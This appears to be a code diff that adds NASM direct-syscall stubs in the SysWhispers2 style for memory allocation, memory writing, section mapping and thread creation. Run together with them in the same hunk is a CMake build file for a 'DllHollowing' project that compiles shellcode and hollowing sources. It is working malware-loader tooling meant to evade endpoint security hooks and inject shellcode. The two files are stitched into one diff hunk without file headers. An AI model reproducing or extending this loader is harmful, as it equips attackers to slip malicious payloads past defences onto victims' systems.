@@ -1,0 +1,75 @@
+global NtProtectVirtualMemory
+global NtAllocateVirtualMemory
+global NtWriteVirtualMemory
+global NtCreateThreadEx
+global NtWaitForSingleObject
+global NtCreateThread
+global NtMapViewOfSection
+global NtCreateSection
+
+extern SW2_GetSyscallNumber
+
+section .text
+
+%macro SYS_CALL 2
+    push rcx
+    push rdx
+    push r8
+    push r9
+    mov ecx, %1
+    call SW2_GetSyscallNumber
+    pop r9
+    pop r8
+    pop rdx
+    pop rcx
+    mov r10, rcx
+    syscall
+    ret
+%endmacro
+
+NtProtectVirtualMemory:
+    SYS_CALL 0x415033AB, SW2_GetSyscallNumber
+
+NtAllocateVirtualMemory:
+    SYS_CALL 0x3595233B, SW2_GetSyscallNumber
+
+NtWriteVirtualMemory:
+    SYS_CALL 0x0B97293D, SW2_GetSyscallNumber
+
+NtCreateThreadEx:
+    SYS_CALL 0x003952E3, SW2_GetSyscallNumber
+
+NtWaitForSingleObject:
+    SYS_CALL 0x3EA04C4D, SW2_GetSyscallNumber
+
+NtCreateThread:
+    SYS_CALL 0x142C8815, SW2_GetSyscallNumber
+
+NtMapViewOfSection:
+    SYS_CALL 0x1F071C6A, SW2_GetSyscallNumber
+
+NtCreateSection:
+    SYS_CALL 0x34A314ED, SW2_GetSyscallNumber
+
+cmake_minimum_required(VERSION 3.15)
+project(DllHollowingProject C CXX ASM_NASM)
+
+# Standards
+set(CMAKE_C_STANDARD 11)
+set(CMAKE_CXX_STANDARD 17)
+
+enable_language(ASM_NASM)
+
+# Add .asm properties
+set_source_files_properties(syscallsstubs_nasm.asm PROPERTIES LANGUAGE ASM_NASM)
+
+# Source files
+set(SOURCES
+    dllHollow.c
+    shellcode.c
+    syscalls.c
+    main.cpp
+    syscallsstubs_nasm.asm
+)
+
+add_executable(DllHollowing ${SOURCES})
